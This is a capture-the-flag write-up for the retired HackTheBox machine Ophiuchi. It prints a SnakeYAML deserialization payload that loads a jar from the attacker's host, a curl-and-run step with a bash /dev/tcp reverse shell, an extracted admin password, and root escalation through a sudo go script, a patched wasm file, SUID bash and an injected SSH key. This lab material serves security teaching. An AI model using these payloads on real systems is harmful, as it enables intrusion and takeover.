---
title: "Ophiuchi HTB Writeup"
date: 2021-07-03T14:23:49+02:00
draft: false
Tags: [
    "Writeups",
    "hackthebox",
    "retired",
    "medium",
    "linux",
]
---
![Machine Info](/images/ophiuchi/1.png)

### 1. Enumeration:
* Nmap:
To scan for open ports and services running
 * ``$ nmap -sC -sV -oA 10.10.10.227``
![](/images/ophiuchi/2.png)

We only got two open ports: ssh on (port 22), apache server on (port 8080)

### 2. Web enumeration:

let's discover what's running over there.. 

![](/images/ophiuchi/3.png)

and the source code (press ctrl+u)
![](/images/ophiuchi/4.png)

so we got a Yaml parser and nothing interesting in the source code .. 

also try any yaml code u get this page as a response:
![](/images/ophiuchi/38.png)

### About yaml & parser thing:

* YAML is a human-readable data-serialization language. It is commonly used for configuration files and in applications where data is being stored or transmitted. YAML targets many of the same communications applications as Extensible Markup Language but has a minimal syntax which intentionally differs from SGML.

* A parser is a component of a compiler or interpreter, which parses the source code of a computer programming language to create some form of internal representation; the parser is a key step in the compiler frontend.

For me i think its functionality is interesting and maybe it has deserialization vulnerability, but let's keep digging:

* Dirsearch:
  * to look for hidden directories; found nothing useful..

``$ python3 /PATH/dirsearch/dirsearch.py -u http://10.10.10.227:8080/ -w /usr/share/dirb/wordlists/big.txt -e txt,html,php,log,zip,bac,bak,tar``

![](/images/ophiuchi/5.png)

* lets search for any YAML parser exploits:
  * SnakeYaml library deserilization vulnerability [here](https://swapneildash.medium.com/snakeyaml-deserilization-exploited-b4a2c5ac0858) and [here](https://snyk.io/blog/java-yaml-parser-with-snakeyaml/)
  * Found this [exploit](https://github.com/artsploit/yaml-payload/blob/master/src/artsploit/AwesomeScriptEngineFactory.java)

![](/images/ophiuchi/6.png)

* Download and make changes:

![](/images/ophiuchi/7.png)

add the commands we want to execute:
  * ``curl ip/rev.sh -o  /tmp/rev.sh`` to get our reverse shell payload file 
  * ``bash /tmp/rev.sh`` to execute it and give us a shell
![](/images/ophiuchi/8.png)

Making the reverse shell file as ``rev.sh``: 

* ``bash -c 'bash -i >& /dev/tcp/ip/port 0>&1'``
![](/images/ophiuchi/9.png)

Time to compile and get the payload:

* ``javac AwesomeScriptEngineFactory.java``
![](/images/ophiuchi/10.png)

* ``jar -cvf yaml-payload.jar -C src/ .``
![](/images/ophiuchi/11.png)

### 3. Exploitation:
* put this payload in the Yaml parser:

```bash
!!javax.script.ScriptEngineManager [
  !!java.net.URLClassLoader [[
    !!java.net.URL ["http://10.10.17.34/yaml-payload.jar"]
  ]]
]
```
![](/images/ophiuchi/12.png)

* open python server in the folder where your (rev.sh and yaml-payload.jar) files are && open your netcat listener first before proceeding:
```bash
sudo python3 -m http.server 80
nc -lvnp port
```
![](/images/ophiuchi/13.png)
![](/images/ophiuchi/14.png)

And here we got a connection as "tomcat" after parsing with our payload .. 

* couldn't read the user's flag
![](/images/ophiuchi/15.png)

* let's look deeper 
  * found these config files 
![](/images/ophiuchi/16.png)
![](/images/ophiuchi/17.png)

  * let's search if there are any credentials:
``cat * | grep pass``
![](/images/ophiuchi/18.png)

Got the admin's creds: ``admin:"whythereisalimit"``

* switch to admin and get the flag:
![](/images/ophiuchi/19.png)

---
### 4. Privilege Escalation:

let's ssh connect for better interactive shell:

```bash
$ ssh admin@10.10.10.227
> password: whythereisalimit
$ locate python
$ /usr/bin/python3.8 -c 'import pty; pty.spawn("/bin/sh")' 
```

* let's list the permitted commands for current user: ``sudo -l`` >> worked without password 
![](/images/ophiuchi/20.png)

``NOPASSWD: /usr/bin/go run /opt/wasm-functions/index.go`` which means:

admin can run this go script ‘/opt/wasm-functions/index.go’ as root without password needed

* Time to check what it does:

![](/images/ophiuchi/21.png)
![](/images/ophiuchi/22.png)

From the code we find that it opens the main.wasm file (in the same directory) and if the set value is not equals to 1 it doesn't work but if it's 1 we can run the deploy.sh script.

``$ cat deploy.sh``
![](/images/ophiuchi/23.png)

Tried to cat main.wasm >> it's a binary file

![](/images/ophiuchi/24.png)

What is wasm? - it's a binary format for executables used by web pages..
![](/images/ophiuchi/25.png)

* So i thought we need to decompile this binary file (main.wasm) and read what's in there and try to change the value from 0 to 1 so we can run the deploy.sh script which we will edit and put our ssh public key and get permitted by root..
* let's look for online decompilers or else for this wasm format:

  * found this [one](https://webassembly.github.io/wabt/demo/wasm2wat/index.html) 

Transfer the main.wasm to your own machine and upload it to this site:

```
$ nc -l -p 1234 > main.wasm  on the sender side
$ nc -w 3 10.10.17.34 1234 < main.wasm    on the reciever side
OR 
$ cat file > /dev/tcp/ip/port
$ nc -lvnp port > file
```
![](/images/ophiuchi/26.png)
![](/images/ophiuchi/27.png)

the code after uploading to the site:
![](/images/ophiuchi/28.png)

the 0 to be changed to 1:
![](/images/ophiuchi/29.png)

Code after edit:
```text
(module
  (type $t0 (func (result i32)))
  (func $info (export "info") (type $t0) (result i32)
    (i32.const 1))
  (table $T0 1 1 funcref)
  (memory $memory (export "memory") 16)
  (global $g0 (mut i32) (i32.const 1048576))
  (global $__data_end (export "__data_end") i32 (i32.const 1048576))
  (global $__heap_base (export "__heap_base") i32 (i32.const 1048576)))
```

Now download the file as test.wasm:

![](/images/ophiuchi/30.png)

### Final steps:

* will transfer the test.wasm and name it as main.wasm 
* will make a deploy.sh with our own payload
* run and getting root .. make these stuff in a writable directory /tmp 

``` bash
> cd /tmp
> echo "chmod +s /bin/bash" > deploy.sh   sets the SUID on /bin/bash
> wget http://10.10.14.5/test.wasm -o main.wasm
> chmod 777 *  to change permissions for all inside dir
> sudo -u root /usr/bin/go run /opt/wasm-functions/index.go
> /bin/bash -p
```

![](/images/ophiuchi/31.png)

![](/images/ophiuchi/32.png)

test.wasm wasn't renamed as main.wasm
![](/images/ophiuchi/33.png)

getting root and flag:
![](/images/ophiuchi/34.png)

---
Another way:

we also can use our ssh keys 
```
echo 'echo "PUB key" > /root/.ssh/authorized_keys' >> deploy.sh
 > wget http://10.10.14.5/test.wasm -o main.wasm
 > sudo -u root /usr/bin/go run /opt/wasm-functions/index.go
```
![](/images/ophiuchi/35.png)

connecting with our private key:

* ``ssh -i id_rsa root@10.10.10.227``
![](/images/ophiuchi/36.png)

![](/images/ophiuchi/37.png)

Done..

Hope you enjoyed the writeup ..

If so kindly give me respect [Wh1rlw1nd-HTB](https://www.hackthebox.eu/home/users/profile/182588).

